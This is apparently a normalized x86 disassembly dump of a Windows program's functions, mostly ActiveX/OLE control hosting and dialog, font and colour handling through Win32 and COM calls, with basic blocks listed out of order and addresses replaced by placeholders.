sub_426fb5
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
push esi
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
xor eax eax
lea esi [ ecx + 0x20 ]
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_43d618
mov ecx [ ebp - 0x8 ]
call sub_428e5d
cmp eax [ ebp + 0x8 ]
je r-xdata
sub_426fff
mov eax sub_464518
call sub_42dc88
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
lea eax [ edi + 0x2cc ]
cmp eax 0xf
ja r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_4271c7 ]
mov eax [ ebp + 0x10 ]
or [ eax + 0x8 ] 0xffff
mov [ eax ] 0xb
jmp r-xdata
mov eax [ ebp + 0x10 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] 0xb
jmp r-xdata
mov esi [ ebp + 0x10 ]
xor edi edi
mov [ esi ] 0x2
cmp [ rw-data ] edi
jne r-xdata
cmp [ esi + 0x3c ] 0xffffffff
jne r-xdata
xor edi edi
cmp [ esi + 0x44 ] edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] 0xb
call sub_4284d6
neg eax
sbb eax eax
mov [ esi + 0x8 ] ax
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov [ esi ] 0x3
call [ GetThreadLocale@IAT ]
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov esi [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x8 ]
mov [ esi ] 0x8
call sub_457110
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea ecx [ ebp + 0x8 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
push 0xf1c0
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
call sub_4437c6
mov esi [ ebp + 0x10 ]
lea ecx [ ebp + 0xc ]
mov [ esi ] 0x8
call sub_457110
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea ecx [ ebp + 0xc ]
push 0x1
pop eax
jmp r-xdata
mov [ esi + 0x8 ] 0x1
jmp r-xdata
call sub_455362
cmp [ eax + 0x20 ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp edi 0xfffffd43
mov [ eax ] 0x3
jne r-xdata
push [ esi + 0x1c ]
lea ecx [ ebp - 0x20 ]
call sub_44756d
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x1c ]
push eax
push [ ebp - 0x1c ]
push 0x138
push eax
call [ SendMessageA@IAT ]
push [ ebp - 0x18 ]
call [ GetBkColor@IAT ]
push [ ebp - 0x18 ]
mov [ esi + 0x3c ] eax
call [ GetTextColor@IAT ]
lea ecx [ ebp - 0x20 ]
mov [ esi + 0x40 ] eax
call sub_4475df
mov edi [ ebp + 0x10 ]
mov [ edi ] 0x9
mov eax [ esi + 0x44 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esi + 0x44 ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov ecx [ esi + 0x1c ]
call sub_427993
push eax
mov ecx esi
call sub_427207
cmp [ esi + 0x44 ] edi
je r-xdata
call sub_442148
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov [ esi + 0x8 ] di
jmp r-xdata
mov esi [ esi + 0x40 ]
mov esi [ esi + 0x3c ]
jmp r-xdata
mov [ eax + 0x8 ] esi
jmp r-xdata
sub_427207
mov eax sub_464544
call sub_42dc88
sub esp 0x7c
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] r--data
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov edi [ GetStockObject@IAT ]
push 0x11
call edi
cmp eax ebx
mov [ ebp - 0x14 ] eax
jne r-xdata
cmp [ eax + 0x4 ] ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
push 0xd
call edi
cmp eax ebx
mov [ ebp - 0x14 ] eax
jne r-xdata
lea ecx [ ebp - 0x88 ]
push ecx
push 0x3c
push [ eax + 0x4 ]
call [ GetObjectA@IAT ]
lea eax [ ebp - 0x6c ]
mov [ ebp - 0x4c ] 0x20
test eax eax
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov edi esp
push esi
push edi
lea eax [ ebp - 0x6c ]
push 0xffffffff
push eax
push ebx
push ebx
mov [ edi ] bx
call [ MultiByteToWideChar@IAT ]
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x48 ] ebx
jmp r-xdata
mov [ esi + 0x44 ] ebx
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push [ esi + 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_44756d
push 0x5a
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x24 ]
call [ GetDeviceCaps@IAT ]
mov ecx eax
mov eax edi
imul eax eax 0xafc80
cdq
idiv ecx
add esi 0x44
mov [ ebp - 0x40 ] ebx
push esi
mov [ ebp - 0x44 ] eax
call sub_4566e5
push esi
lea eax [ ebp - 0x4c ]
push r--data
push eax
call [ Ordinal_OLEPRO32_253@IAT ]
test eax eax
jge r-xdata
neg eax
mov edi eax
mov ax [ ebp - 0x78 ]
mov [ ebp - 0x3c ] ax
movzx ax [ ebp - 0x71 ]
mov [ ebp - 0x3a ] ax
movzx eax [ ebp - 0x74 ]
mov [ ebp - 0x38 ] eax
movzx eax [ ebp - 0x73 ]
mov [ ebp - 0x34 ] eax
movzx eax [ ebp - 0x72 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x88 ]
cmp eax ebx
mov edi eax
jge r-xdata
lea ecx [ ebp - 0x18 ]
call sub_4477b8
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x94 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_4475df
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi ] ebx
sub_4273c5
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
leave
retn 0x4
push esi
lea esi [ ecx + 0x20 ]
lea eax [ ebp - 0x8 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_43d618
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_4288c8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop esi
sub_427406
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
leave
retn 0x8
push esi
lea esi [ ecx + 0x20 ]
lea eax [ ebp - 0x4 ]
mov ecx esi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_43d618
push [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x2c
push [ ebp + 0x8 ]
push eax
call [ OffsetRect@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x50 ]
add ecx 0x2c
push ecx
push ecx
mov edx [ eax ]
push eax
call [ edx + 0x1c ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop esi
sub_427460
push esi
mov esi ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esi + 0x48 ] eax
pop esi
retn 0x4
mov eax [ eax + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_42748e
mov eax [ ecx ]
push [ esp + 0x4 ]
call [ eax + 0x70 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ eax + 0x38 ]
test ecx ecx
jne r-xdata
push [ esp + 0x8 ]
mov eax [ ecx ]
push 0x3
push 0x0
push ecx
call [ eax + 0x6c ]
add esp 0x10
push ecx
push [ esp + 0xc ]
push 0xf1
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
sub_4274cb
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
pop edi
pop esi
retn 0xc
mov eax [ edi ]
xor ecx ecx
cmp esi [ esp + 0x14 ]
sete cl
push ecx
push esi
mov ecx edi
call [ eax + 0x64 ]
inc esi
jmp r-xdata
cmp esi [ esp + 0x10 ]
jg r-xdata
sub_42750e
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push [ esp + 0xc ]
push eax
call [ GetDlgItem@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ eax + 0x1c ]
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
retn 0x8
mov eax [ esi ]
push [ esp + 0xc ]
mov ecx esi
call [ eax + 0x50 ]
test eax eax
je r-xdata
mov edi [ eax + 0x20 ]
sub_42754a
push ebp
mov ebp esp
sub esp 0x100
mov eax [ ecx ]
lea edx [ ebp - 0x100 ]
push 0x100
push edx
push [ ebp + 0x8 ]
call [ eax + 0x78 ]
test eax eax
jne r-xdata
movsx eax [ ebp - 0x100 ]
push esi
push edi
push eax
lea esi [ ebp - 0x100 ]
call sub_42f0cf
mov edi [ CharNextA@IAT ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
push esi
call edi
mov esi eax
movsx eax [ esi ]
push eax
call sub_42f0cf
test eax eax
pop ecx
jne r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
push esi
call edi
mov esi eax
cmp al 0x2d
jne r-xdata
leave
retn 0xc
test eax eax
je r-xdata
mov [ ecx ] eax
movsx eax [ esi ]
push eax
call sub_42f00a
pop ecx
pop edi
mov ecx [ ebp + 0xc ]
pop esi
test ecx ecx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
push 0xa
lea eax [ ebp - 0x100 ]
push 0x0
push eax
je r-xdata
call sub_42ea75
call sub_42e859
jmp r-xdata
add esp 0xc
sub_42763c
push ebp
mov ebp esp
sub esp 0x24
cmp [ ebp + 0x10 ] 0x0
push esi
lea eax [ ebp - 0x24 ]
push 0xa
push eax
mov esi ecx
push [ ebp + 0xc ]
je r-xdata
call sub_42d680
call sub_42d656
jmp r-xdata
mov eax [ esi ]
add esp 0xc
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0x84 ]
pop esi
leave
retn 0xc
sub_427694
mov eax sub_464564
call sub_42dc88
push ecx
push ecx
mov eax [ ecx ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
call [ eax + 0x70 ]
xor ecx ecx
cmp eax ecx
jne r-xdata
cmp [ eax + 0x38 ] ecx
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
push edx
push 0x3
push ecx
mov ecx eax
call sub_4418b0
mov eax [ ebp + 0x8 ]
cmp eax 0xffff
jne r-xdata
push ecx
push ecx
push 0xf0
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x1
pop eax
sub_427764
push ebx
mov ebx [ esp + 0x8 ]
push edi
mov eax [ ebx - 0x4 ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebx
retn 0xc
mov edi [ eax + 0x54 ]
push esi
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebx - 0x4 ]
test edi edi
mov [ eax + 0x54 ] esi
pop esi
je r-xdata
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
mov eax [ edi ]
push edi
call [ eax + 0x8 ]
sub_4277b6
mov eax sub_464578
call sub_42dc88
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
cmp [ esi + 0x20 ] edi
mov [ ebp - 0x4 ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_456ab4
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ esi + 0x2c ] edi
mov ebx [ esi + 0x24 ]
jbe r-xdata
mov eax [ ebx ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
add ebx 0x4
cmp edi [ esi + 0x2c ]
jb r-xdata
sub_427828
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_456b02
test eax eax
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
push 0x1
pop eax
sub_427885
mov eax sub_46458d
call sub_42dc88
sub esp 0x20
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
test [ ebp + 0xc ] 0x1
mov [ ebp - 0x10 ] esp
mov [ eax ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push 0x38
call sub_441e89
mov esi eax
pop ecx
mov [ ebp - 0x28 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ esi - 0x24 ]
mov [ ebp - 0x14 ] eax
shl eax 0x2
push eax
call sub_441e89
mov [ ebp + 0x8 ] eax
mov eax [ esi - 0x24 ]
xor edi edi
pop ecx
neg eax
sbb eax eax
mov [ ebp - 0x1c ] eax
xor esi esi
jmp r-xdata
push 0x1
mov ecx esi
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push 0x4
call sub_456a59
mov [ esi ] r--data
jmp r-xdata
lea eax [ ebp + 0xc ]
lea ecx [ esi - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_43d618
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4c ]
mov [ ecx + edi * 4 ] eax
mov eax [ ebp - 0x1c ]
inc edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] ebx
jl r-xdata
cmp eax ebx
je r-xdata
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x10 ]
add esi 0x34
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
mov edi [ ebp - 0x14 ]
cmp edi ebx
jbe r-xdata
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
add esi 0x4
dec edi
jne r-xdata
sub_42794b
mov esi [ ebp - 0x20 ]
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] ebx
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x10 ]
add esi 0x34
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
mov edi [ ebp - 0x14 ]
cmp edi ebx
jbe r-xdata
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
add esi 0x4
dec edi
jne r-xdata
sub_4279af
mov eax sub_4645a0
call sub_42dc88
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_44195c
mov eax [ ebp + 0x8 ]
or [ esi + 0x28 ] 0xffffffff
xor edi edi
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0x1c ] eax
mov [ esi + 0x24 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
call sub_457a16
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov eax [ rw-data ]
mov [ esi + 0x9c ] eax
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xb8 ] r--data
mov [ esi + 0xbc ] r--data
mov [ esi + 0xc0 ] r--data
mov [ esi + 0xc4 ] r--data
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
lea ebx [ esi + 0xa8 ]
push 0x10
mov [ esi + 0xd4 ] r--data
push edi
mov [ esi + 0xd8 ] r--data
push ebx
mov [ esi ] r--data
call sub_42dc30
mov ecx [ ebp - 0xc ]
add esp 0xc
mov [ ebx ] di
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_427ad2
mov eax sub_4645cd
call sub_42dc88
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov edi [ esi + 0x88 ]
xor ebx ebx
cmp edi ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov ecx esi
call sub_42893b
push [ esi + 0x60 ]
lea eax [ esi + 0x3c ]
mov ecx esi
push eax
call sub_4285b7
push [ esi + 0x64 ]
mov ecx esi
push r--data
call sub_4285b7
push [ esi + 0x84 ]
mov ecx esi
push r--data
call sub_4285b7
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
mov ecx edi
call sub_429966
push edi
call sub_441eb2
pop ecx
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov eax [ esi + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ esi + 0x50 ] ebx
mov eax [ esi + 0x4c ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esi + 0x54 ] ebx
lea eax [ esi + 0xa8 ]
push eax
call [ VariantClear@IAT ]
push ebx
push 0xffffffff
mov ecx esi
call sub_4291c2
cmp [ esi + 0x94 ] ebx
je r-xdata
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xc ]
mov eax [ esi + 0x4c ]
push 0x1
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esi + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ esi + 0x4c ] ebx
lea ecx [ esi + 0x9c ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] bl
call sub_457a3c
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_441976
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi + 0x90 ]
cmp eax ebx
je r-xdata
mov ecx [ eax + 0x88 ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push ebx
push esi
call [ eax + 0x8 ]
sub_427bfe
mov eax sub_4645e0
call sub_42dc88
sub esp 0x1c
push esi
mov esi ecx
push edi
push 0x0
mov ecx [ esi + 0x34 ]
mov eax [ esi + 0x38 ]
sub ecx [ esi + 0x2c ]
sub eax [ esi + 0x30 ]
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
call sub_4474b9
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_451789
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
call [ ecx + 0x44 ]
mov edi eax
test edi edi
jl r-xdata
xor eax eax
lea ecx [ ebp - 0x28 ]
test edi edi
setge al
or [ ebp - 0x4 ] 0xffffffff
mov esi eax
call sub_44752b
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
call [ ecx + 0x48 ]
test eax eax
jl r-xdata
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x28 ]
push eax
call sub_451817
mov eax [ ebp - 0x14 ]
add eax [ esi + 0x2c ]
mov [ esi + 0x34 ] eax
mov eax [ esi + 0x30 ]
add eax [ ebp - 0x10 ]
mov [ esi + 0x38 ] eax
sub_427ca6
mov eax sub_4645f4
call sub_42dc88
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov ebx ecx
xor esi esi
cmp eax esi
mov [ ebx + 0x20 ] esi
je r-xdata
call sub_453349
cmp [ eax + 0x114 ] esi
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ eax + 0x38 ] ebx
push edi
mov ecx ebx
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
call sub_4281a0
cmp eax esi
mov [ ebp + 0x8 ] eax
jl r-xdata
call sub_456395
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov eax [ ebp + 0x20 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0x1c ]
cmp eax esi
jne r-xdata
mov eax 0x80004005
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ eax ]
mov esi [ eax + 0x4 ]
lea edi [ ebx + 0x2c ]
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
add edx eax
add esi ecx
mov [ ebp - 0x18 ] esi
lea esi [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push esi
lea ecx [ ebp - 0x38 ]
call sub_4474b9
mov eax [ ebx + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
mov [ ebp - 0x4 ] esi
call [ ecx + 0x48 ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x38 ]
push eax
call sub_451817
mov ecx [ ebp + 0x18 ]
mov edx [ ebp - 0x14 ]
lea edi [ ebx + 0x2c ]
lea esi [ ebp - 0x24 ]
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0x24 ] eax
add eax edx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
add eax ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] eax
or [ ebp - 0x4 ] 0xffffffff
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
call sub_44752b
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x28
test ah 0x4
je r-xdata
mov [ ebx + 0x68 ] 0x30001
mov eax [ ebx + 0x70 ]
mov [ ebx + 0x68 ] 0x30000
test ah 0x10
je r-xdata
mov eax [ ebx + 0x68 ]
and eax [ ebp + 0x14 ]
cmp [ ebp + 0x8 ] 0x1
mov [ ebx + 0x6c ] eax
je r-xdata
and [ ebp + 0x17 ] 0xef
lea eax [ ebx + 0xd4 ]
mov ecx ebx
push eax
push r--data
call sub_42854f
mov ecx ebx
mov [ ebx + 0x84 ] eax
call sub_427bfe
mov eax [ ebx + 0x4c ]
lea edi [ ebx + 0x50 ]
push edi
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
xor esi esi
mov [ ebp + 0x8 ] eax
cmp eax esi
jl r-xdata
lea eax [ ebx + 0xcc ]
mov ecx ebx
push eax
lea eax [ ebx + 0x3c ]
push eax
call sub_42854f
mov [ ebx + 0x60 ] eax
lea eax [ ebx + 0xc8 ]
push eax
push r--data
mov ecx ebx
call sub_42854f
mov [ ebx + 0x64 ] eax
mov eax [ edi ]
cmp eax esi
je r-xdata
test [ ebp + 0x17 ] 0x10
je r-xdata
push [ ebx + 0x60 ]
lea eax [ ebx + 0x3c ]
mov ecx ebx
push eax
call sub_4285b7
push [ ebx + 0x64 ]
mov ecx ebx
push r--data
call sub_4285b7
push [ ebx + 0x84 ]
mov ecx ebx
push r--data
call sub_4285b7
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x60 ] esi
mov [ ebx + 0x64 ] esi
mov [ ebx + 0x84 ] esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp + 0x8 ] esi
mov [ ebx + 0x4c ] esi
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ edi ] esi
mov esi [ OffsetRect@IAT ]
mov eax 0xffff8300
push eax
push eax
lea eax [ ebx + 0x2c ]
push eax
call esi
mov eax [ ebx ]
push 0x0
push 0xfffffffb
mov ecx ebx
call [ eax + 0x54 ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ ebx ]
push esi
push 0xfffffffb
mov ecx ebx
call [ eax + 0x54 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov ecx ebx
call sub_4288fe
cmp [ ebp + 0x10 ] esi
je r-xdata
xor esi esi
mov eax [ ebx ]
push 0x0
push 0xfffffffd
mov ecx ebx
call [ eax + 0x54 ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
cmp [ ebp + 0x8 ] esi
jl r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebx ]
and eax 0x8800000
push esi
or eax [ ebx + 0x6c ]
mov ecx ebx
push eax
push esi
call [ edx + 0x78 ]
mov eax [ ebx ]
push [ ebp + 0x10 ]
mov ecx ebx
call [ eax + 0x80 ]
mov eax 0x7d00
push eax
push eax
lea eax [ ebx + 0x2c ]
push eax
call esi
mov ecx [ edi ]
lea eax [ ebx + 0x2c ]
push eax
push eax
mov edx [ ecx ]
push ecx
call [ edx + 0x1c ]
mov [ ebp + 0x8 ] eax
xor esi esi
mov ecx ebx
call sub_42878f
jmp r-xdata
sub_427f43
push esi
mov esi ecx
mov ecx [ esi + 0x1c ]
push [ esi + 0x20 ]
add ecx 0x20
call sub_43d5d6
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0xa0 ]
test esi esi
je r-xdata
push 0x1
pop eax
pop esi
retn
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_427f72
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push r--data
push edi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ CoGetClassObject@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
lea eax [ ebp + 0x1c ]
mov [ ebp + 0x1c ] edi
push eax
push r--data
push edi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ CoGetClassObject@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
mov eax esi
pop edi
pop esi
leave
retn 0x18
push [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0x1c ]
mov ecx [ eax ]
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push eax
call [ ecx + 0x1c ]
mov esi eax
mov eax [ ebp - 0x4 ]
push [ ebp + 0x18 ]
mov eax [ ebp + 0x1c ]
push [ ebp + 0x14 ]
mov ecx [ eax ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0xc ]
mov esi eax
mov eax [ ebp + 0x1c ]
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_427fff
mov eax sub_464608
call sub_42dc88
sub esp 0x70
push ebx
push esi
mov esi ecx
xor ebx ebx
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
mov eax [ esi + 0x4c ]
push edx
push r--data
push eax
mov ecx [ eax ]
mov [ ebp - 0x14 ] ebx
call [ ecx ]
test eax eax
jl r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
lea eax [ esi + 0xb8 ]
push edi
mov [ ebp - 0x78 ] eax
lea eax [ esi + 0xc8 ]
mov [ ebp - 0x70 ] eax
lea eax [ esi + 0xcc ]
mov [ ebp - 0x6c ] eax
